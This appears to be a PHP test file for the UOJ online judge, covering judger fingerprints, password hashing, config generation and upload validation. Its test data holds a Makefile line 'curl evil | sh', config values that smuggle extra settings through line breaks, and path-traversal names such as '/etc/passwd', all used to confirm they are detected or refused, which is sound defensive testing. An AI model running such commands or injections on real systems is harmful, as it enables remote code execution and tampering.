<?php

require_once __DIR__ . '/../app/libs/uoj-validate-lib.php';
require_once __DIR__ . '/../app/libs/uoj-judger-lib.php';
require_once __DIR__ . '/../app/libs/uoj-data-lib.php';

// builds an upload folder of a problem with a custom judger and returns its fingerprint
function fingerprint_of($files, $conf) {
	$dir = sys_get_temp_dir() . '/uoj_fingerprint_test_' . getmypid();
	exec('rm -rf ' . escapeshellarg($dir));
	mkdir("$dir/require", 0755, true);
	foreach ($files as $name => $content) {
		file_put_contents("$dir/$name", $content);
	}
	$fingerprint = dataCustomJudgerFingerprint($dir, $conf);
	exec('rm -rf ' . escapeshellarg($dir));
	return $fingerprint;
}

$files = [
	'problem.conf' => "use_builtin_judger off\n",
	'Makefile' => "all: judger std val\n",
	'judger.cpp' => "int main() {}\n",
	'std.cpp' => "int main() {}\n",
	'require/lib.h' => "// lib\n",
	'input1.txt' => "1 2\n",
	'output1.txt' => "3\n",
	'ex_input1.txt' => "2 3\n",
	'ex_output1.txt' => "5\n",
];
$conf = ['use_builtin_judger' => 'off', 'n_tests' => '1', 'n_ex_tests' => '1', 'time_limit' => '1'];
$approved = fingerprint_of($files, $conf);

check_same(64, strlen($approved), 'the fingerprint is a SHA256');
check_same($approved, fingerprint_of($files, $conf), 'the fingerprint is stable');
check_same($approved, fingerprint_of($files, array_reverse($conf, true)), 'the order of problem.conf does not matter');

// what a successful hack does: one more extra test
$hacked = $files + ['ex_input2.txt' => "\x00\xff\r\n", 'ex_output2.txt' => "9\n"];
$hacked_conf = ['n_ex_tests' => 2] + $conf;
check_same($approved, fingerprint_of($hacked, $hacked_conf), 'a new extra test keeps the fingerprint');
check_same($approved, fingerprint_of(['ex_input1.txt' => "7 7\n"] + $files, $conf), 'the content of an extra test does not matter');

// everything else has to be approved again
$changed = function($files, $conf) use ($approved) {
	return fingerprint_of($files, $conf) !== $approved;
};
check_same(true, $changed(['Makefile' => "all:\n\tcurl evil | sh\n"] + $files, $conf), 'a changed Makefile');
check_same(true, $changed(['judger.cpp' => "int main() { return 1; }\n"] + $files, $conf), 'a changed judger');
check_same(true, $changed(['require/lib.h' => "// evil\n"] + $files, $conf), 'a changed file in a subfolder');
check_same(true, $changed(['input1.txt' => "5 5\n"] + $files, $conf), 'a changed main test');
check_same(true, $changed($files + ['helper.sh' => "#!/bin/sh\n"], $conf), 'a new file');
check_same(true, $changed($files + ['ex_input2.txt' => "1\n"], $conf), 'a file named like an extra test that is not one');
check_same(true, $changed($files, ['time_limit' => '100'] + $conf), 'a changed limit');
check_same(true, $changed($files, $conf + ['input_suf' => 'cpp']), 'a changed file name pattern');
check_same(true, $changed(array_diff_key($files, ['std.cpp' => 0]), $conf), 'a removed file');

// ---- the password of a judger is kept as a hash
$judger_password = 'Wd3kq0aFz7Jv9XuP2mYt8RcL5nHs1GbE';
$stored = judgerPasswordToStore($judger_password);
check_same('sha256:' . hash('sha256', $judger_password), $stored, 'the hash of a judger password');
check_same(true, strlen($stored) <= 100, 'the hash fits the column');
check_same(true, judgerPasswordMatches($stored, $judger_password), 'the password of a judger');
check_same(false, judgerPasswordMatches($stored, $judger_password . 'x'), 'a wrong password');
check_same(false, judgerPasswordMatches($stored, $stored), 'the hash is not the password');
check_same(false, judgerPasswordMatches($stored, substr($stored, 7)), 'neither is the hash without its prefix');
// a row that was written by hand is accepted once, and hashed then
check_same(true, judgerPasswordMatches($judger_password, $judger_password), 'a password that is not hashed yet');
check_same(false, judgerPasswordMatches($judger_password, 'something else'), 'a wrong password for one that is not hashed yet');
check_same(false, judgerPasswordMatches('', ''), 'a judger without a password');
check_same(false, judgerPasswordIsHashed($judger_password), 'a password is not a hash');
check_same(true, judgerPasswordIsHashed($stored), 'a hash is a hash');

// problem.conf built from the settings form
$settings = [
	'use_builtin_checker' => 'ncmp', 'n_tests' => '10', 'n_ex_tests' => '', 'n_sample_tests' => '2',
	'input_pre' => 'data', 'input_suf' => 'in', 'output_pre' => 'data', 'output_suf' => 'out',
	'time_limit' => '1', 'memory_limit' => '256',
];
check_same([
	'use_builtin_judger' => 'on', 'use_builtin_checker' => 'ncmp', 'n_tests' => '10', 'n_ex_tests' => '0', 'n_sample_tests' => '2',
	'input_pre' => 'data', 'input_suf' => 'in', 'output_pre' => 'data', 'output_suf' => 'out',
	'time_limit' => '1', 'memory_limit' => '256',
], dataProblemConfFromSettings($settings), 'settings of an ordinary problem');
check_same(false, isset(dataProblemConfFromSettings(['use_builtin_checker' => 'ownchk'] + $settings)['use_builtin_checker']), 'a custom checker');
check_same('0.5', dataProblemConfFromSettings(['time_limit' => '0.5'] + $settings)['time_limit'], 'a fractional time limit');

$invalid = [
	'a line break adds a setting' => ['input_pre' => "data\nuse_builtin_judger off"],
	'a space adds a value' => ['output_suf' => 'out extra'],
	'a carriage return' => ['memory_limit' => "256\rtime_limit 100"],
	'a checker with a path' => ['use_builtin_checker' => '../../bin/sh'],
	'a file name with a path' => ['input_pre' => '../data'],
	'no tests' => ['n_tests' => '0'],
	'a negative number of tests' => ['n_tests' => '-1'],
	'a missing value' => ['input_suf' => ''],
	'an array instead of a value' => ['time_limit' => ['1']],
	'a time limit that is not a number' => ['time_limit' => '1s'],
	'no time limit' => ['time_limit' => '0'],
	'a memory limit that is not a number' => ['memory_limit' => '256MB'],
];
foreach ($invalid as $what => $override) {
	check_same(null, dataProblemConfFromSettings($override + $settings), $what);
}

// the files of a version of the data of a problem
$dir = sys_get_temp_dir() . '/uoj_manifest_test_' . getmypid();
exec('rm -rf ' . escapeshellarg($dir));
mkdir("$dir/require", 0755, true);
file_put_contents("$dir/problem.conf", "n_tests 1\n");
file_put_contents("$dir/input1.txt", "1 2\n");
file_put_contents("$dir/require/lib.h", "");
check_same([
	'input1.txt' => [4, hash('sha256', "1 2\n")],
	'problem.conf' => [10, hash('sha256', "n_tests 1\n")],
	'require/lib.h' => [0, hash('sha256', '')],
], dataManifest($dir), 'the manifest of a folder');
exec('rm -rf ' . escapeshellarg($dir));

check_same('/var/uoj_data/prepare_7', dataStageDir(7), 'the staging folder of a problem');
check_same('/var/uoj_data/archive/7/3.zip', dataArchivePath(7, 3), 'the archive of an old version');

// ---- what an uploaded archive may hold, and where its files go
require_once __DIR__ . '/../app/libs/uoj-upload-lib.php';

foreach (array('input1.txt', 'data/input1.txt', 'require/lib.h', '数据/输入 1.txt', 'a/b/c/d/e/f.txt') as $name) {
	check_same('', uploadNameError($name), "$name may be unpacked");
}
$bad_names = array('', '/etc/passwd', '../input1.txt', 'data/../../x', 'a//b', './x', 'C:/x', 'a\\b', "a\nb", "a\x00b", 'a/b/c/d/e/f/g.txt', str_repeat('x', 201), array('x'));
foreach ($bad_names as $name) {
	check_same(true, uploadNameError($name) !== '', 'refused as the name of a file: ' . json_encode($name));
}
foreach (array('__MACOSX/data/._input1.txt', 'data/.DS_Store', 'Thumbs.db', '._problem.conf') as $name) {
	check_same(true, uploadIsJunk($name), "$name is left out");
}
check_same(false, uploadIsJunk('data/input1.txt'), 'a file of the data is not');

check_same(array('problem.conf' => 'problem.conf', 'input1.txt' => 'input1.txt'), uploadTargets(array('problem.conf', 'input1.txt')), 'files at the top stay where they are');
check_same(array('data/problem.conf' => 'problem.conf', 'data/input1.txt' => 'input1.txt', 'data/require/lib.h' => 'require/lib.h'),
	uploadTargets(array('data/', 'data/problem.conf', 'data/input1.txt', 'data/require/', 'data/require/lib.h', '__MACOSX/data/._input1.txt', 'data/.DS_Store')),
	'an archive of a folder is unpacked without the folder, and without the junk');
check_same(array('a/x.txt' => 'a/x.txt', 'b/y.txt' => 'b/y.txt'), uploadTargets(array('a/x.txt', 'b/y.txt')), 'two folders are not one');
check_same(array('problem.conf' => 'problem.conf', 'require/lib.h' => 'require/lib.h'), uploadTargets(array('problem.conf', 'require/lib.h')), 'a file at the top keeps the folders');
check_same(array('require/lib.h' => 'require/lib.h'), uploadTargets(array('require/lib.h')), 'require is a folder of the data itself');
check_same(array('my problem/data 1/in.txt' => 'data 1/in.txt'), uploadTargets(array('my problem/data 1/in.txt')), 'names with spaces are names like any other');
check_same(array(), uploadTargets(array('data/', '__MACOSX/x')), 'an archive without files');

$limits = array('files' => 3, 'bytes' => 1000, 'file_bytes' => 600, 'ratio' => 0);
$entry = function($name, $size = 10, $compressed = 5, $is_link = false) {
	return array('name' => $name, 'size' => $size, 'compressed' => $compressed, 'is_link' => $is_link);
};
check_same('', uploadEntriesError(array($entry('problem.conf'), $entry('input1.txt'), $entry('output1.txt')), $limits), 'an archive within the limits');
check_same('', uploadEntriesError(array($entry('a'), $entry('b'), $entry('c'), $entry('__MACOSX/._a'), $entry('.DS_Store')), $limits), 'junk does not count');
$refused = array(
	'too many files' => array($entry('a'), $entry('b'), $entry('c'), $entry('d')),
	'a file that is too big' => array($entry('a', 601)),
	'too much altogether' => array($entry('a', 400), $entry('b', 400), $entry('c', 400)),
	'a name that climbs out' => array($entry('../a')),
	'a symbolic link' => array($entry('a', 10, 5, true)),
	'nothing but folders and junk' => array($entry('data/', 0, 0), $entry('.DS_Store')),
	'two files that become one' => array($entry('Input1.txt'), $entry('input1.txt')),
);
foreach ($refused as $what => $entries) {
	check_same(true, uploadEntriesError($entries, $limits) !== '', "refused: $what");
}
check_same(true, uploadEntriesError(array($entry('a', 500)), $limits, 600) !== '', 'refused: too much with what the problem holds already');
check_same('', uploadEntriesError(array($entry('a', 500)), $limits, 500), 'just enough room');
check_same('', uploadEntriesError(array($entry('a', 500, 1)), $limits), 'how well an archive packs is not looked at unless asked');
check_same(true, uploadEntriesError(array($entry('a', 500, 1)), array('ratio' => 100) + $limits) !== '', 'refused: an archive that packs better than allowed');

// ---- what is wrong with the data of a problem before it is synced
$conf = array('use_builtin_judger' => 'on', 'use_builtin_checker' => 'ncmp', 'n_tests' => '2', 'n_ex_tests' => '1', 'n_sample_tests' => '1',
	'input_pre' => 'in', 'input_suf' => 'txt', 'output_pre' => 'out', 'output_suf' => 'txt', 'time_limit' => '1', 'memory_limit' => '256');
$files = array('problem.conf', 'in1.txt', 'out1.txt', 'in2.txt', 'out2.txt', 'ex_in1.txt', 'ex_out1.txt');
$report = uploadPreflight($files, $conf, false);
check_same(array(array(), array()), array($report['errors'], $report['warnings']), 'data that is all there');
check_same(true, in_array('2 个测试点', $report['facts'], true), 'and the report says what there is');
$errors_of = function($files, $conf, $hackable = false) {
	return join(' | ', uploadPreflight($files, $conf, $hackable)['errors']);
};
check_same(true, strpos($errors_of(array(), -1), '还没有上传') !== false, 'nothing was uploaded');
check_same(true, strpos($errors_of(array('in1.txt'), -1), 'problem.conf') !== false, 'no problem.conf');
check_same(true, strpos($errors_of($files, -2), '语法错误') !== false, 'a problem.conf that can not be read');
check_same(true, strpos($errors_of(array_diff($files, array('out2.txt', 'ex_in1.txt')), $conf), 'out2.txt、ex_in1.txt') !== false, 'files that are missing are named');
check_same(true, strpos($errors_of($files, array('n_tests' => '0') + $conf), 'n_tests') !== false, 'no tests');
check_same(true, strpos($errors_of($files, array('n_sample_tests' => '2') + $conf), 'n_sample_tests') !== false, 'more samples than extra tests');
$without = $conf;
unset($without['n_sample_tests']);
check_same(true, strpos($errors_of($files, $without), 'n_sample_tests') !== false, 'the number of samples that is not written is the number of tests');
unset($without['use_builtin_checker']);
check_same(true, strpos($errors_of($files, array('n_sample_tests' => '1') + $without), 'chk.cpp') !== false, 'no checker');
check_same('', $errors_of(array_merge($files, array('chk.cpp', 'testlib.h')), array('n_sample_tests' => '1') + $without), 'a checker of its own');
check_same(true, strpos($errors_of($files, $conf, true), 'std.cpp') !== false && strpos($errors_of($files, $conf, true), 'val.cpp') !== false, 'a problem that can be hacked needs a solution and a validator');
check_same('', $errors_of(array_merge($files, array('std.cpp', 'val.cpp')), $conf, true), 'and has them');
$warnings = uploadPreflight(array_merge($files, array('in3.txt', 'out3.txt')), array('time_limit' => '600') + $conf, false)['warnings'];
check_same(2, count($warnings), 'files nothing uses and a limit out of the ordinary are worth a look');
check_same(true, strpos(join(' ', $warnings), 'in3.txt') !== false, 'the files nothing uses are named');
// a run-twice problem needs its relay, and is neither interactive nor open to hacks
$twice = array('run_twice' => 'on') + $conf;
check_same(true, strpos($errors_of($files, $twice), 'relay.cpp') !== false, 'a run-twice problem without its relay');
check_same('', $errors_of(array_merge($files, array('relay.cpp')), $twice), 'and with it');
check_same(true, in_array('通信题：程序运行两次，中转程序 relay 由评测机编译', uploadPreflight(array_merge($files, array('relay.cpp')), $twice, false)['facts'], true), 'the report says the problem is run twice');
check_same(array(), uploadPreflight(array_merge($files, array('relay.cpp')), $twice, false)['warnings'], 'the relay is not a file nothing uses');
check_same(true, strpos($errors_of(array_merge($files, array('relay.cpp', 'std.cpp', 'val.cpp')), $twice, true), 'Hack') !== false, 'a run-twice problem can not be hacked');
check_same(true, strpos($errors_of(array_merge($files, array('relay.cpp', 'interactor.cpp')), array('interaction_mode' => 'on') + $twice), '交互题') !== false, 'nor be interactive');
check_same(true, strpos($errors_of(array_merge($files, array('relay.cpp')), array('submit_answer' => 'on') + $twice), '提交答案') !== false, 'nor ask for answers only');
$custom = uploadPreflight(array('problem.conf', 'judger.cpp', 'Makefile'), array('use_builtin_judger' => 'off'), false);
check_same(array(0, 1), array(count($custom['errors']), count($custom['warnings'])), 'a judger of its own is said to need the system administrator');

